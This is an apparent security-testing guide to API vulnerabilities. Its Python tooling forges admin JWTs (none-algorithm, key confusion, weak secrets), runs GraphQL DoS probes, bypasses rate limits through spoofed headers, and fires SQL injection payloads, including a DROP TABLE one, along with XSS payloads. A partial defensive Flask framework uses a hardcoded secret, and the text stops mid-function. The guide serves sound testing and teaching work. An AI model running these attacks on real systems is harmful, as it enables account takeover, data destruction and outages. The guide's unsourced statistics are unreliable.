# 🔌 API Security Vulnerabilities - Complete Guide

> **The backbone of modern applications - Master REST, GraphQL, and API security testing**

## 📚 Table of Contents
- [Introduction](#introduction)
- [Types of API Vulnerabilities](#types-of-api-vulnerabilities)
- [Detection Techniques](#detection-techniques)
- [Exploitation Methods](#exploitation-methods)
- [Advanced Techniques](#advanced-techniques)
- [Prevention & Mitigation](#prevention--mitigation)
- [Practice Labs](#practice-labs)
- [Real-World Examples](#real-world-examples)

## 🎯 Introduction

API Security vulnerabilities represent critical attack vectors in modern web applications. As APIs become the foundation of microservices, mobile apps, and cloud integrations, understanding API security is essential for comprehensive security testing.

### 🔍 What Makes API Vulnerabilities Dangerous?
- **Data exposure** - Direct access to sensitive business data
- **Authentication bypass** - Circumvent security controls
- **Business logic flaws** - Exploit application workflows
- **Rate limiting bypass** - Overwhelm systems with requests
- **Injection attacks** - Execute malicious code through API parameters
- **Privilege escalation** - Access unauthorized functionality

### 📊 API Security Statistics
- **Found in 95%** of web applications with APIs
- **Average bounty**: $1,500 - $8,000
- **Severity range**: Medium to Critical
- **Time to exploit**: Minutes to hours
- **Growing attack surface** - APIs increase 200% year over year

## 🔬 Types of API Vulnerabilities

### 1. 🔓 Broken Authentication & Authorization

#### JWT Token Vulnerabilities
```python
#!/usr/bin/env python3
"""
JWT Security Testing Framework

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import jwt
import base64
import json
import requests
from typing import Dict, List, Any

class JWTSecurityTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
    
    def test_jwt_vulnerabilities(self, token: str) -> List[Dict]:
        """Comprehensive JWT vulnerability testing"""
        vulnerabilities = []
        
        # Test 1: None algorithm attack
        none_vuln = self.test_none_algorithm(token)
        if none_vuln:
            vulnerabilities.append(none_vuln)
        
        # Test 2: Algorithm confusion (RS256 to HS256)
        alg_vuln = self.test_algorithm_confusion(token)
        if alg_vuln:
            vulnerabilities.append(alg_vuln)
        
        # Test 3: Weak secret brute force
        weak_secret = self.test_weak_secret(token)
        if weak_secret:
            vulnerabilities.append(weak_secret)
        
        # Test 4: Key confusion attack
        key_confusion = self.test_key_confusion(token)
        if key_confusion:
            vulnerabilities.append(key_confusion)
        
        return vulnerabilities
    
    def test_none_algorithm(self, token: str) -> Dict:
        """Test for None algorithm vulnerability"""
        try:
            # Decode token without verification
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            # Create new token with 'none' algorithm
            header['alg'] = 'none'
            payload['admin'] = True  # Escalate privileges
            
            # Encode new token
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')
            
            malicious_token = f"{header_b64}.{payload_b64}."
            
            # Test the malicious token
            if self.test_token_validity(malicious_token):
                return {
                    'type': 'JWT None Algorithm',
                    'severity': 'Critical',
                    'token': malicious_token,
                    'description': 'JWT accepts none algorithm, allowing signature bypass'
                }
        
        except Exception as e:
            print(f"None algorithm test failed: {e}")
        
        return None
    
    def test_algorithm_confusion(self, token: str) -> Dict:
        """Test for algorithm confusion (RS256 to HS256)"""
        try:
            # Get public key (in real scenario, extract from jwks endpoint)
            public_key = self.get_public_key()
            if not public_key:
                return None
            
            # Decode original token
            payload = jwt.decode(token, options={"verify_signature": False})
            payload['admin'] = True  # Escalate privileges
            
            # Sign with public key using HS256
            malicious_token = jwt.encode(
                payload, 
                public_key, 
                algorithm='HS256'
            )
            
            if self.test_token_validity(malicious_token):
                return {
                    'type': 'JWT Algorithm Confusion',
                    'severity': 'High',
                    'token': malicious_token,
                    'description': 'JWT vulnerable to RS256/HS256 confusion attack'
                }
        
        except Exception as e:
            print(f"Algorithm confusion test failed: {e}")
        
        return None
    
    def test_weak_secret(self, token: str) -> Dict:
        """Test for weak JWT secrets"""
        common_secrets = [
            'secret', 'password', '123456', 'admin', 'test',
            'key', 'jwt', 'token', 'auth', 'login'
        ]
        
        for secret in common_secrets:
            try:
                # Try to decode with common secret
                decoded = jwt.decode(token, secret, algorithms=['HS256'])
                
                # If successful, create admin token
                decoded['admin'] = True
                malicious_token = jwt.encode(decoded, secret, algorithm='HS256')
                
                return {
                    'type': 'JWT Weak Secret',
                    'severity': 'High',
                    'secret': secret,
                    'token': malicious_token,
                    'description': f'JWT uses weak secret: {secret}'
                }
            
            except jwt.InvalidTokenError:
                continue
        
        return None
    
    def get_public_key(self) -> str:
        """Retrieve public key from JWKS endpoint"""
        try:
            response = requests.get(f"{self.target_url}/.well-known/jwks.json")
            if response.status_code == 200:
                jwks = response.json()
                # Extract first key (simplified)
                if 'keys' in jwks and len(jwks['keys']) > 0:
                    return jwks['keys'][0]
        except:
            pass
        return None
    
    def test_token_validity(self, token: str) -> bool:
        """Test if token is accepted by the application"""
        headers = {'Authorization': f'Bearer {token}'}
        
        try:
            response = requests.get(
                f"{self.target_url}/api/user/profile",
                headers=headers
            )
            
            # Check if request was successful
            return response.status_code == 200
        
        except:
            return False

# Usage
tester = JWTSecurityTester("https://api.target.com")
vulnerabilities = tester.test_jwt_vulnerabilities("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...")
```

### 2. 📊 GraphQL Vulnerabilities

#### GraphQL Security Testing
```python
class GraphQLSecurityTester:
    def __init__(self, graphql_endpoint: str):
        self.endpoint = graphql_endpoint
        self.session = requests.Session()
    
    def test_introspection(self) -> Dict:
        """Test if GraphQL introspection is enabled"""
        introspection_query = """
        query IntrospectionQuery {
            __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                    ...FullType
                }
            }
        }
        
        fragment FullType on __Type {
            kind
            name
            description
            fields(includeDeprecated: true) {
                name
                description
                args {
                    ...InputValue
                }
                type {
                    ...TypeRef
                }
            }
        }
        
        fragment InputValue on __InputValue {
            name
            description
            type { ...TypeRef }
            defaultValue
        }
        
        fragment TypeRef on __Type {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
        """
        
        response = self.send_graphql_query(introspection_query)
        
        if response and 'data' in response and '__schema' in response['data']:
            return {
                'type': 'GraphQL Introspection Enabled',
                'severity': 'Medium',
                'description': 'GraphQL introspection reveals schema information',
                'schema_info': response['data']['__schema']
            }
        
        return None
    
    def test_depth_limit_bypass(self) -> Dict:
        """Test for query depth limit bypass"""
        deep_query = """
        query DeepQuery {
            user {
                posts {
                    comments {
                        author {
                            posts {
                                comments {
                                    author {
                                        posts {
                                            comments {
                                                author {
                                                    id
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        """
        
        response = self.send_graphql_query(deep_query)
        
        if response and 'data' in response:
            return {
                'type': 'GraphQL Depth Limit Bypass',
                'severity': 'High',
                'description': 'No depth limiting allows resource exhaustion attacks',
                'query': deep_query
            }
        
        return None
    
    def test_batch_query_attack(self) -> Dict:
        """Test for batch query vulnerabilities"""
        batch_queries = []
        
        # Create 100 identical queries
        for i in range(100):
            batch_queries.append({
                'query': 'query { users { id name email } }',
                'variables': {}
            })
        
        response = self.send_batch_queries(batch_queries)
        
        if response and isinstance(response, list) and len(response) > 50:
            return {
                'type': 'GraphQL Batch Query Attack',
                'severity': 'Medium',
                'description': 'No batch query limiting allows DoS attacks',
                'batch_size': len(response)
            }
        
        return None
    
    def test_field_suggestions(self) -> Dict:
        """Test for field suggestion information disclosure"""
        invalid_query = """
        query {
            user {
                id
                invalidFieldName
            }
        }
        """
        
        response = self.send_graphql_query(invalid_query)
        
        if (response and 'errors' in response and 
            any('did you mean' in str(error).lower() for error in response['errors'])):
            return {
                'type': 'GraphQL Field Suggestions',
                'severity': 'Low',
                'description': 'Field suggestions reveal schema information',
                'errors': response['errors']
            }
        
        return None
    
    def send_graphql_query(self, query: str, variables: Dict = None) -> Dict:
        """Send GraphQL query to endpoint"""
        payload = {'query': query}
        if variables:
            payload['variables'] = variables
        
        try:
            response = self.session.post(
                self.endpoint,
                json=payload,
                headers={'Content-Type': 'application/json'}
            )
            
            return response.json()
        
        except Exception as e:
            print(f"GraphQL query failed: {e}")
            return None
    
    def send_batch_queries(self, queries: List[Dict]) -> List[Dict]:
        """Send batch GraphQL queries"""
        try:
            response = self.session.post(
                self.endpoint,
                json=queries,
                headers={'Content-Type': 'application/json'}
            )
            
            return response.json()
        
        except Exception as e:
            print(f"Batch query failed: {e}")
            return None

# Usage
graphql_tester = GraphQLSecurityTester("https://api.target.com/graphql")
introspection_vuln = graphql_tester.test_introspection()
depth_vuln = graphql_tester.test_depth_limit_bypass()
```

### 3. 🚦 Rate Limiting & DoS Vulnerabilities

#### Rate Limiting Bypass Techniques
```python
class RateLimitBypassTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_rate_limit_bypass(self) -> List[Dict]:
        """Test various rate limiting bypass techniques"""
        vulnerabilities = []
        
        # Test 1: IP rotation bypass
        ip_bypass = self.test_ip_rotation_bypass()
        if ip_bypass:
            vulnerabilities.append(ip_bypass)
        
        # Test 2: Header manipulation bypass
        header_bypass = self.test_header_manipulation()
        if header_bypass:
            vulnerabilities.append(header_bypass)
        
        # Test 3: User-Agent rotation
        ua_bypass = self.test_user_agent_rotation()
        if ua_bypass:
            vulnerabilities.append(ua_bypass)
        
        # Test 4: HTTP method bypass
        method_bypass = self.test_http_method_bypass()
        if method_bypass:
            vulnerabilities.append(method_bypass)
        
        return vulnerabilities
    
    def test_ip_rotation_bypass(self) -> Dict:
        """Test IP rotation to bypass rate limits"""
        headers_list = [
            {'X-Forwarded-For': '192.168.1.1'},
            {'X-Real-IP': '10.0.0.1'},
            {'X-Originating-IP': '172.16.0.1'},
            {'X-Remote-IP': '203.0.113.1'},
            {'X-Client-IP': '198.51.100.1'}
        ]
        
        successful_requests = 0
        
        for i in range(50):  # Try 50 requests
            headers = headers_list[i % len(headers_list)]
            
            try:
                response = self.session.get(
                    f"{self.target_url}/api/sensitive-endpoint",
                    headers=headers
                )
                
                if response.status_code == 200:
                    successful_requests += 1
                elif response.status_code == 429:  # Rate limited
                    break
            
            except:
                break
        
        if successful_requests > 20:  # Threshold for bypass
            return {
                'type': 'Rate Limit IP Bypass',
                'severity': 'Medium',
                'description': 'Rate limiting bypassed using IP header manipulation',
                'successful_requests': successful_requests
            }
        
        return None
    
    def test_header_manipulation(self) -> Dict:
        """Test header manipulation for rate limit bypass"""
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': 'localhost'},
            {'X-Cluster-Client-IP': '192.168.1.1'},
            {'CF-Connecting-IP': '10.0.0.1'},
            {'True-Client-IP': '172.16.0.1'}
        ]
        
        for headers in bypass_headers:
            if self.test_bypass_with_headers(headers):
                return {
                    'type': 'Rate Limit Header Bypass',
                    'severity': 'Medium',
                    'description': f'Rate limiting bypassed using headers: {headers}',
                    'bypass_headers': headers
                }
        
        return None
    
    def test_user_agent_rotation(self) -> Dict:
        """Test User-Agent rotation for bypass"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'curl/7.68.0',
            'PostmanRuntime/7.28.0'
        ]
        
        successful_requests = 0
        
        for i in range(30):
            ua = user_agents[i % len(user_agents)]
            headers = {'User-Agent': ua}
            
            try:
                response = self.session.get(
                    f"{self.target_url}/api/test",
                    headers=headers
                )
                
                if response.status_code == 200:
                    successful_requests += 1
            except:
                break
        
        if successful_requests > 15:
            return {
                'type': 'Rate Limit User-Agent Bypass',
                'severity': 'Low',
                'description': 'Rate limiting bypassed using User-Agent rotation',
                'successful_requests': successful_requests
            }
        
        return None
    
    def test_http_method_bypass(self) -> Dict:
        """Test HTTP method variation for bypass"""
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']
        
        for method in methods:
            if self.test_method_bypass(method):
                return {
                    'type': 'Rate Limit Method Bypass',
                    'severity': 'Medium',
                    'description': f'Rate limiting bypassed using {method} method',
                    'bypass_method': method
                }
        
        return None
    
    def test_bypass_with_headers(self, headers: Dict) -> bool:
        """Test if specific headers bypass rate limiting"""
        try:
            # Make multiple requests with headers
            for _ in range(10):
                response = self.session.get(
                    f"{self.target_url}/api/test",
                    headers=headers
                )
                
                if response.status_code == 429:
                    return False
            
            return True  # No rate limiting encountered
        
        except:
            return False
    
    def test_method_bypass(self, method: str) -> bool:
        """Test if specific HTTP method bypasses rate limiting"""
        try:
            for _ in range(10):
                response = self.session.request(
                    method,
                    f"{self.target_url}/api/test"
                )
                
                if response.status_code == 429:
                    return False
            
            return True
        
        except:
            return False

# Usage
rate_tester = RateLimitBypassTester("https://api.target.com")
bypass_vulns = rate_tester.test_rate_limit_bypass()
```

### 4. 🔍 API Enumeration & Information Disclosure

#### API Discovery and Enumeration
```python
class APIEnumerationTester:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.discovered_endpoints = []
    
    def discover_api_endpoints(self) -> List[Dict]:
        """Discover API endpoints through various techniques"""
        discoveries = []
        
        # Test common API paths
        common_paths = self.test_common_api_paths()
        discoveries.extend(common_paths)
        
        # Test version enumeration
        versions = self.test_api_versions()
        discoveries.extend(versions)
        
        # Test documentation endpoints
        docs = self.test_documentation_endpoints()
        discoveries.extend(docs)
        
        # Test debug endpoints
        debug = self.test_debug_endpoints()
        discoveries.extend(debug)
        
        return discoveries
    
    def test_common_api_paths(self) -> List[Dict]:
        """Test for common API endpoint patterns"""
        common_endpoints = [
            '/api/v1/users',
            '/api/v2/users',
            '/api/users',
            '/v1/users',
            '/v2/users',
            '/rest/users',
            '/graphql',
            '/api/graphql',
            '/api/admin',
            '/api/internal',
            '/api/private',
            '/api/test',
            '/api/debug',
            '/api/health',
            '/api/status',
            '/api/config'
        ]
        
        discoveries = []
        
        for endpoint in common_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                response = self.session.get(url)
                
                if response.status_code in [200, 201, 400, 401, 403]:
                    discovery = {
                        'type': 'API Endpoint Discovery',
                        'url': url,
                        'status_code': response.status_code,
                        'content_type': response.headers.get('content-type', ''),
                        'response_size': len(response.content)
                    }
                    
                    # Check for sensitive information
                    if self.contains_sensitive_info(response.text):
                        discovery['severity'] = 'High'
                        discovery['sensitive_data'] = True
                    else:
                        discovery['severity'] = 'Medium'
                    
                    discoveries.append(discovery)
            
            except:
                continue
        
        return discoveries
    
    def test_api_versions(self) -> List[Dict]:
        """Test for different API versions"""
        version_patterns = [
            '/api/v{}/users',
            '/v{}/api/users',
            '/{}/users',
            '/api/{}/users'
        ]
        
        discoveries = []
        
        for pattern in version_patterns:
            for version in range(1, 6):  # Test v1 to v5
                endpoint = pattern.format(version)
                url = f"{self.base_url}{endpoint}"
                
                try:
                    response = self.session.get(url)
                    
                    if response.status_code in [200, 400, 401, 403]:
                        discoveries.append({
                            'type': 'API Version Discovery',
                            'url': url,
                            'version': f'v{version}',
                            'status_code': response.status_code,
                            'severity': 'Medium'
                        })
                
                except:
                    continue
        
        return discoveries
    
    def test_documentation_endpoints(self) -> List[Dict]:
        """Test for API documentation endpoints"""
        doc_endpoints = [
            '/docs',
            '/api/docs',
            '/swagger',
            '/api/swagger',
            '/swagger-ui',
            '/swagger-ui.html',
            '/api-docs',
            '/redoc',
            '/openapi.json',
            '/swagger.json',
            '/api/openapi.json',
            '/api/swagger.json'
        ]
        
        discoveries = []
        
        for endpoint in doc_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                response = self.session.get(url)
                
                if response.status_code == 200:
                    discoveries.append({
                        'type': 'API Documentation Exposure',
                        'url': url,
                        'status_code': response.status_code,
                        'severity': 'High',
                        'description': 'API documentation publicly accessible'
                    })
            
            except:
                continue
        
        return discoveries
    
    def test_debug_endpoints(self) -> List[Dict]:
        """Test for debug and admin endpoints"""
        debug_endpoints = [
            '/debug',
            '/api/debug',
            '/admin',
            '/api/admin',
            '/internal',
            '/api/internal',
            '/test',
            '/api/test',
            '/health',
            '/api/health',
            '/status',
            '/api/status',
            '/metrics',
            '/api/metrics',
            '/actuator',
            '/actuator/health',
            '/actuator/info',
            '/actuator/env'
        ]
        
        discoveries = []
        
        for endpoint in debug_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                response = self.session.get(url)
                
                if response.status_code == 200:
                    severity = 'Critical' if 'admin' in endpoint else 'High'
                    
                    discoveries.append({
                        'type': 'Debug/Admin Endpoint Exposure',
                        'url': url,
                        'status_code': response.status_code,
                        'severity': severity,
                        'description': f'Debug endpoint {endpoint} accessible'
                    })
            
            except:
                continue
        
        return discoveries
    
    def contains_sensitive_info(self, response_text: str) -> bool:
        """Check if response contains sensitive information"""
        sensitive_patterns = [
            'password',
            'secret',
            'token',
            'api_key',
            'private_key',
            'database',
            'connection_string',
            'admin',
            'root'
        ]
        
        response_lower = response_text.lower()
        return any(pattern in response_lower for pattern in sensitive_patterns)

# Usage
enumerator = APIEnumerationTester("https://api.target.com")
discovered_endpoints = enumerator.discover_api_endpoints()
```

## 🔍 Detection Techniques

### 1. 🤖 Automated API Security Scanner

#### Comprehensive API Security Scanner
```python
#!/usr/bin/env python3
"""
Comprehensive API Security Scanner

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

import requests
import json
import time
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Any

class APISecurityScanner:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.vulnerabilities = []
        
        # Configure session
        self.session.headers.update({
            'User-Agent': 'APISecurityScanner/1.0'
        })
    
    def run_comprehensive_scan(self) -> Dict[str, Any]:
        """Run comprehensive API security scan"""
        print(f"Starting comprehensive API security scan on {self.base_url}")
        
        scan_results = {
            'target': self.base_url,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': [],
            'summary': {}
        }
        
        # 1. API Discovery
        print("1. Discovering API endpoints...")
        discovery_results = self.discover_apis()
        scan_results['vulnerabilities'].extend(discovery_results)
        
        # 2. Authentication Testing
        print("2. Testing authentication mechanisms...")
        auth_results = self.test_authentication()
        scan_results['vulnerabilities'].extend(auth_results)
        
        # 3. Authorization Testing
        print("3. Testing authorization controls...")
        authz_results = self.test_authorization()
        scan_results['vulnerabilities'].extend(authz_results)
        
        # 4. Input Validation Testing
        print("4. Testing input validation...")
        input_results = self.test_input_validation()
        scan_results['vulnerabilities'].extend(input_results)
        
        # 5. Rate Limiting Testing
        print("5. Testing rate limiting...")
        rate_results = self.test_rate_limiting()
        scan_results['vulnerabilities'].extend(rate_results)
        
        # 6. Information Disclosure Testing
        print("6. Testing for information disclosure...")
        info_results = self.test_information_disclosure()
        scan_results['vulnerabilities'].extend(info_results)
        
        # Generate summary
        scan_results['summary'] = self.generate_summary(scan_results['vulnerabilities'])
        
        return scan_results
    
    def discover_apis(self) -> List[Dict]:
        """Discover API endpoints and versions"""
        discoveries = []
        
        # Test common API patterns
        api_patterns = [
            '/api',
            '/api/v1',
            '/api/v2',
            '/v1',
            '/v2',
            '/rest',
            '/graphql'
        ]
        
        for pattern in api_patterns:
            url = f"{self.base_url}{pattern}"
            
            try:
                response = self.session.get(url, timeout=10)
                
                if response.status_code in [200, 400, 401, 403, 405]:
                    discoveries.append({
                        'type': 'API Endpoint Discovery',
                        'severity': 'Info',
                        'url': url,
                        'status_code': response.status_code,
                        'description': f'API endpoint discovered: {pattern}'
                    })
            
            except requests.RequestException:
                continue
        
        return discoveries
    
    def test_authentication(self) -> List[Dict]:
        """Test authentication mechanisms"""
        vulnerabilities = []
        
        # Test for missing authentication
        test_endpoints = [
            '/api/users',
            '/api/admin',
            '/api/user/profile',
            '/api/sensitive-data'
        ]
        
        for endpoint in test_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Missing Authentication',
                        'severity': 'High',
                        'url': url,
                        'description': f'Endpoint accessible without authentication: {endpoint}'
                    })
            
            except requests.RequestException:
                continue
        
        # Test JWT vulnerabilities
        jwt_vulns = self.test_jwt_security()
        vulnerabilities.extend(jwt_vulns)
        
        return vulnerabilities
    
    def test_authorization(self) -> List[Dict]:
        """Test authorization controls"""
        vulnerabilities = []
        
        # Test for IDOR vulnerabilities
        idor_endpoints = [
            '/api/user/{id}',
            '/api/order/{id}',
            '/api/document/{id}',
            '/api/profile/{id}'
        ]
        
        for endpoint_template in idor_endpoints:
            # Test with different IDs
            for user_id in [1, 2, 100, 999]:
                endpoint = endpoint_template.format(id=user_id)
                url = f"{self.base_url}{endpoint}"
                
                try:
                    response = self.session.get(url, timeout=10)
                    
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'Potential IDOR',
                            'severity': 'High',
                            'url': url,
                            'description': f'Possible IDOR vulnerability in {endpoint}'
                        })
                        break  # Found one, move to next endpoint
                
                except requests.RequestException:
                    continue
        
        return vulnerabilities
    
    def test_input_validation(self) -> List[Dict]:
        """Test input validation vulnerabilities"""
        vulnerabilities = []
        
        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --"
        ]
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>"
        ]
        
        # Test endpoints with payloads
        test_endpoints = [
            '/api/search?q={}',
            '/api/user?name={}',
            '/api/filter?category={}'
        ]
        
        for endpoint_template in test_endpoints:
            # Test SQL injection
            for payload in sql_payloads:
                endpoint = endpoint_template.format(payload)
                url = f"{self.base_url}{endpoint}"
                
                try:
                    response = self.session.get(url, timeout=10)
                    
                    if self.detect_sql_injection(response):
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'Critical',
                            'url': url,
                            'payload': payload,
                            'description': 'SQL injection vulnerability detected'
                        })
                
                except requests.RequestException:
                    continue
            
            # Test XSS
            for payload in xss_payloads:
                endpoint = endpoint_template.format(payload)
                url = f"{self.base_url}{endpoint}"
                
                try:
                    response = self.session.get(url, timeout=10)
                    
                    if payload in response.text:
                        vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'High',
                            'url': url,
                            'payload': payload,
                            'description': 'XSS vulnerability detected'
                        })
                
                except requests.RequestException:
                    continue
        
        return vulnerabilities
    
    def test_rate_limiting(self) -> List[Dict]:
        """Test rate limiting implementation"""
        vulnerabilities = []
        
        test_url = f"{self.base_url}/api/test"
        
        # Send multiple requests quickly
        request_count = 0
        rate_limited = False
        
        for i in range(50):
            try:
                response = self.session.get(test_url, timeout=5)
                request_count += 1
                
                if response.status_code == 429:  # Too Many Requests
                    rate_limited = True
                    break
            
            except requests.RequestException:
                break
        
        if not rate_limited and request_count > 30:
            vulnerabilities.append({
                'type': 'Missing Rate Limiting',
                'severity': 'Medium',
                'url': test_url,
                'requests_sent': request_count,
                'description': 'No rate limiting detected on API endpoint'
            })
        
        return vulnerabilities
    
    def test_information_disclosure(self) -> List[Dict]:
        """Test for information disclosure vulnerabilities"""
        vulnerabilities = []
        
        # Test for verbose error messages
        error_endpoints = [
            '/api/nonexistent',
            '/api/user/invalid-id',
            '/api/search?q=',
            '/api/login'
        ]
        
        for endpoint in error_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                response = self.session.get(url, timeout=10)
                
                if self.contains_sensitive_error_info(response.text):
                    vulnerabilities.append({
                        'type': 'Information Disclosure',
                        'severity': 'Medium',
                        'url': url,
                        'description': 'Verbose error messages reveal sensitive information'
                    })
            
            except requests.RequestException:
                continue
        
        return vulnerabilities
    
    def test_jwt_security(self) -> List[Dict]:
        """Test JWT security vulnerabilities"""
        # This would integrate with the JWTSecurityTester class
        # For brevity, returning empty list
        return []
    
    def detect_sql_injection(self, response: requests.Response) -> bool:
        """Detect SQL injection vulnerability indicators"""
        sql_error_patterns = [
            'sql syntax',
            'mysql_fetch',
            'ora-01756',
            'microsoft ole db',
            'sqlite_master',
            'postgresql error'
        ]
        
        response_text = response.text.lower()
        return any(pattern in response_text for pattern in sql_error_patterns)
    
    def contains_sensitive_error_info(self, response_text: str) -> bool:
        """Check for sensitive information in error messages"""
        sensitive_patterns = [
            'stack trace',
            'file path',
            'database error',
            'internal server error',
            'exception',
            'debug information'
        ]
        
        response_lower = response_text.lower()
        return any(pattern in response_lower for pattern in sensitive_patterns)
    
    def generate_summary(self, vulnerabilities: List[Dict]) -> Dict:
        """Generate scan summary"""
        summary = {
            'total_vulnerabilities': len(vulnerabilities),
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0,
            'info': 0
        }
        
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'info').lower()
            if severity in summary:
                summary[severity] += 1
        
        # Calculate risk score
        risk_score = (summary['critical'] * 10 + 
                     summary['high'] * 7 + 
                     summary['medium'] * 4 + 
                     summary['low'] * 2 + 
                     summary['info'] * 1)
        
        summary['risk_score'] = risk_score
        
        if risk_score >= 50:
            summary['risk_level'] = 'Critical'
        elif risk_score >= 30:
            summary['risk_level'] = 'High'
        elif risk_score >= 15:
            summary['risk_level'] = 'Medium'
        else:
            summary['risk_level'] = 'Low'
        
        return summary

# Usage
scanner = APISecurityScanner("https://api.target.com")
results = scanner.run_comprehensive_scan()

# Print results
print(json.dumps(results, indent=2))
```

## 🛡️ Prevention & Mitigation

### 1. 🔒 Secure API Development Framework

#### API Security Best Practices Implementation
```python
#!/usr/bin/env python3
"""
Secure API Development Framework

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech
"""

from flask import Flask, request, jsonify, g
from functools import wraps
import jwt
import time
import hashlib
from typing import Dict, Any, Callable

class SecureAPIFramework:
    def __init__(self, app: Flask):
        self.app = app
        self.rate_limit_storage = {}
        self.jwt_secret = "your-secret-key"  # Use environment variable in production
        
        # Initialize security middleware
        self.setup_security_middleware()
    
    def setup_security_middleware(self):
        """Setup security middleware for the Flask app"""
        
        @self.app.before_request
        def security_headers():
            """Add security headers to all responses"""
            pass
        
        @self.app.after_request
        def add_security_headers(response):
            """Add security headers"""
            response.headers['X-Content-Type-Options'] = 'nosniff'
            response.headers['X-Frame-Options'] = 'DENY'
            response.headers['X-XSS-Protection'] = '1; mode=block'
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
            response.headers['Content-Security-Policy'] = "default-src 'self'"
            return response
    
    def require_auth(self, f: Callable) -> Callable:
        """Authentication decorator"""
        @wraps(f)
        def decorated_function(*args, **kwargs):
            token = request.headers.get('Authorization')
            
            if not token:
                return jsonify({'error': 'Authentication required'}), 401
            
            try:
                # Remove 'Bearer ' prefix
                if token.startswith('Bearer '):
                    token = token[7:]
                
                # Decode JWT token
                payload = jwt.decode(token, self.jwt_secret, algorithms=['HS256'])
                g.current_user = payload
                
            except jwt.ExpiredSignatureError:
                return jsonify({'error': 'Token expired'}), 401
            except jwt.InvalidTokenError:
                return jsonify({'error': 'Invalid token'}), 401
            
            return f(*args, **kwargs)
        
        return decorated_function
    
    def require_role(self, required_role: str) -> Callable:
        """Role-based authorization decorator"""
        def decorator(f: Callable) -> Callable:
            @wraps(f)
            def decorated_function(*args, **kwargs):
                if not hasattr(g, 'current_user'):
                    return jsonify({'error': 'Authentication required'}), 401
                
                user_role = g.current_user.get('role', 'user')
                
                if user_role != required_role and user_role != 'admin':
                    return jsonify({'error': 'Insufficient permissions'}), 403
                
                return f(*args, **kwargs)
            
            return decorated_function
        return decorator
    
    def rate_limit(self, max_requests: int = 100, window: int = 3600) -> Callable:
        """Rate limiting decorator"""
        def decorator(f: Callable) -> Callable:
            @wraps(f)
            def decorated_function(*args, **kwargs):
                # Get client identifier
                client_ip = request.remote_addr
                user_agent = request.headers.get('User-Agent', '')
                client_id = hashlib.md5(f"{client_ip}{user_agent}".encode()).hexdigest()
                
                current_time = time.time()
                window_start = current_time - window
                
                # Clean old requests
                if client_id in self.rate_limit_storage:
                    self.rate_limit_storage[client_id] = [
                        req_time for req_time in self.rate_limit_storage[client_id]
                        if req_time > window_start
                    ]
                else:
                    self.rate_limit_storage[client_id] = []
                
                # Check rate limit
                if len(self.rate_limit_storage[client_id]) >= max_requests:
                    return jsonify({
                        'error': 'Rate limit exceeded',
                        'retry_after': window
                    }), 429
                
                # Add current request
                self.rate_limit_storage[client_id].append(current_time)
                
                return f(*args, **kwargs)
            
            return decorated_function
        return decorator
    
    def validate_input(self, schema: Dict[str, Any]) -> Callable:
        """Input validation decorator"""
        def decorator(f: Callable) -> Callable:
            @wraps(f)
            def decorated_function(*args, **kwargs):
                data = request.get_json()
                
                if not data:
                    return jsonify({'error': 'JSON data required'}), 400
                
                # Validate against schema
                validation_errors = self.validate_data(data, schema)
                
                if validation_errors:
                    return jsonify({
                        'error': 'Validation failed',
                        'details': validation_errors
                    }), 400
                
                return f(*args, **kwargs)
            
            return decorated_function
        return decorator
    
    def validate_data(self, data: Dict, schema: Dict) -> List[str]:
        """Validate data against schema"""
        errors = []
        
        for field, rules in schema.items():
            value = data.get(field)
            
            # Check required fields
            if rules.get('required', False) and value is None:
                errors.append(f"Field '{field}' is required")
                continue
            
            if value is not None:
                # Check data type
                expected_type = rules.get('type')
                if expected_type and not isinstance(value, expected_type):
                    errors.append(f"Field '{field}' must be of type {expected_type.__name__}")
                
                # Check string length
                if isinstance(value, str):
                    min_length = rules.get('min_length', 0)
